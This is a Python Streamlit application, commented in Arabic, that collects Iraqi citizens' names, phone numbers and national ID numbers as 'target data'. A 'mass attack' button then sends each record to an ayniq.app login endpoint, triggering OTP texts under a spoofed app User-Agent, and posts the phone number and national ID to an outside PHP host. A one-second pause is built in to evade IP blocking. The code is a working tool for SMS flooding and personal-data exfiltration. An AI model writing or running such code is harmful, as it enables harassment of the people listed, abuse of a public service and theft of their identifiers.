import streamlit as st
import sqlite3
import requests
import pandas as pd
import time

# ==========================================
# 1. إعدادات السيرفر وقاعدة البيانات
# ==========================================
def init_db():
    conn = sqlite3.connect('ayniq_master.db')
    c = conn.cursor()
    # جدول تخزين بيانات المواطنين
    c.execute('''CREATE TABLE IF NOT EXISTS citizens 
                 (id INTEGER PRIMARY KEY, name TEXT, phone TEXT, nat_id TEXT, status TEXT DEFAULT 'Pending')''')
    conn.commit()
    return conn

conn = init_db()

# ==========================================
# 2. واجهة الإدارة (Sidebar)
# ==========================================
st.sidebar.image("https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/Coat_of_arms_of_Iraq.svg/1200px-Coat_of_arms_of_Iraq.svg.png", width=80)
st.sidebar.title("لوحة تحكم المنظومة")
mode = st.sidebar.selectbox("القائمة الرئسية", ["إضافة مواطنين", "تنفيذ الإرسال المجمع", "سجل العمليات"])

# ==========================================
# 3. محرك الإرسال (The Engine) - الربط بالروابط المكتشفة
# ==========================================
def send_to_ayniq(phone, nat_id):
    """
    هذه الوظيفة ترسل البيانات للروابط التي استخرجتها أنت.
    """
    # 1. رابط طلب الـ OTP (من api.ayniq.app)
    auth_url = "https://api.ayniq.app/api/v1/auth/login"
    
    # 2. رابط الحجز النهائي (الذي وجدته في funxd.xyz)
    booking_url = "https://funxd.xyz/booking.php"
    
    headers = {
        "User-Agent": "Dart/3.0 (dart:io)", # محاكاة تطبيق فلاتر كما ظهر في الكاناري
        "Content-Type": "application/json",
        "Host": "api.ayniq.app"
    }
    
    payload = {"phone": phone, "national_id": nat_id}

    try:
        # الخطوة أ: طلب الكود
        res_auth = requests.post(auth_url, json={"phone": phone}, headers=headers, timeout=10)
        
        # الخطوة ب: إرسال البيانات لرابط الـ PHP المكتشف
        # ملاحظة: رابط الـ PHP غالباً ما يستقبل Form Data
        res_book = requests.post(booking_url, data=payload, timeout=10)
        
        return res_auth.status_code, res_book.status_code
    except Exception as e:
        return 500, str(e)

# ==========================================
# 4. شاشات النظام
# ==========================================

if mode == "إضافة مواطنين":
    st.title("📥 تجميع بيانات الهدف")
    with st.form("add_form"):
        name = st.text_input("الاسم الرباعي")
        phone = st.text_input("رقم الهاتف (07XXXXXXXX)")
        nid = st.text_input("الرقم الوطني (12 رقم)")
        if st.form_submit_button("حفظ في قاعدة البيانات"):
            if len(nid) == 12 and phone:
                c = conn.cursor()
                c.execute("INSERT INTO citizens (name, phone, nat_id) VALUES (?, ?, ?)", (name, phone, nid))
                conn.commit()
                st.success(f"تم بنجاح حفظ بيانات: {name}")

elif mode == "تنفيذ الإرسال المجمع":
    st.title("🚀 نظام الإرسال المكثف (Mass Trigger)")
    df = pd.read_sql_query("SELECT * FROM citizens WHERE status = 'Pending'", conn)
    st.write(f"عدد الطلبات الجاهزة: {len(df)}")
    st.dataframe(df)

    if st.button("بدء الهجوم المجمع الآن 🔥"):
        progress = st.progress(0)
        for index, row in df.iterrows():
            st.write(f"جاري الإرسال لـ: {row['name']}...")
            
            # استدعاء المحرك الحقيقي
            auth_code, book_code = send_to_ayniq(row['phone'], row['nat_id'])
            
            if auth_code == 200:
                st.toast(f"✅ تم إرسال SMS لـ {row['phone']}")
                conn.cursor().execute("UPDATE citizens SET status = 'Sent' WHERE id = ?", (row['id'],))
                conn.commit()
            
            progress.progress((index + 1) / len(df))
            time.sleep(1) # فاصل زمني لتجنب حظر الـ IP

elif mode == "سجل العمليات":
    st.title("📜 سجل البيانات المرسلة")
    df_sent = pd.read_sql_query("SELECT * FROM citizens WHERE status = 'Sent'", conn)
    st.table(df_sent)
